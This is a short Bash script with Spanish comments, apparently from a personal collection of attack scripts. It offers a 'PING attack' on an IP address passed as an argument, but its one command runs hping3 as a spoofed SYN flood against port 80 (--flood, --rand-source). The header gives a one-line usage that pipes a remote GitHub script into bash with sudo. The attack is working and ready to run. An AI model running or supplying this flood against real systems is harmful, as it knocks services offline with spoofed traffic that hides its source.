#!/bin/bash

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para instalar realizar ataques PING a una IP determinada
#
# Ejecución remota con sudo:
#   https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/Ping.sh | bash -s "172.16.0.209"
# ----------

#Este comando genera tráfico SYN masivo hacia el puerto 80 desde IPs aleatorias.
vIPDestino="$1"
hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source "$vIPDestino"
